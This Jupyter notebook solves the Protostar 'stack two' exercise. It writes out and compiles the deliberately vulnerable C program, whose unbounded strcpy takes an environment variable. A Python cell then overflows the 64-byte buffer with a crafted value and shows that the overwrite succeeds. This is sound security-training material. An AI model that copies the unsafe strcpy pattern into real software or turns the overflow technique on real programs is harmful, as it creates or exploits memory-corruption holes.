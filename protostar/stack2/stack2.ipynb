{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "13c10c12",
   "metadata": {},
   "source": [
    "# protostar/stack2 solution\n",
    "\n",
    "https://exploit.education/protostar/stack-two/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e19c27a8",
   "metadata": {},
   "source": [
    "## compile source code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a0b4e5c3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "src = r\"\"\"\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  volatile int modified;\n",
    "  char buffer[64];\n",
    "  char *variable;\n",
    "\n",
    "  variable = getenv(\"GREENIE\");\n",
    "\n",
    "  if(variable == NULL) {\n",
    "      errx(1, \"please set the GREENIE environment variable\\n\");\n",
    "  }\n",
    "\n",
    "  modified = 0;\n",
    "\n",
    "  strcpy(buffer, variable);\n",
    "\n",
    "  if(modified == 0x0d0a0d0a) {\n",
    "      printf(\"you have correctly modified the variable\\n\");\n",
    "  } else {\n",
    "      printf(\"Try again, you got 0x%08x\\n\", modified);\n",
    "  }\n",
    "\n",
    "}\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "with open(\"src.c\", \"w\") as f:\n",
    "    f.write(src)\n",
    "    \n",
    "_ = os.system('gcc src.c -m32 -w -o prog')  # 32bit. disable warnings."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f905ff2",
   "metadata": {},
   "source": [
    "## solution\n",
    "\n",
    "Setting enviroment variable with length > 64 will cause a buffer overflow.\n",
    "The next 4 bytes after the buffer should be `0x0d0a0d0a`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "ec0e683a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "you have correctly modified the variable\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "import subprocess\n",
    "import struct\n",
    "\n",
    "bts = b'A'*64 + struct.pack(\"<I\", 0x0d0a0d0a)  # Pack 0x0d0a0d0a as little endian.\n",
    "os.environ[\"GREENIE\"] = bts.decode('utf-8')\n",
    "res = subprocess.run(['./prog'], capture_output=True)\n",
    "del os.environ['GREENIE']\n",
    "print(res.stdout.decode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2146293d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python version\n",
      "3.9.10 (main, Jan 16 2022, 17:12:18) \n",
      "[GCC 11.2.0]\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "print(\"Python version\")\n",
    "print (sys.version)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a2ea1f23",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
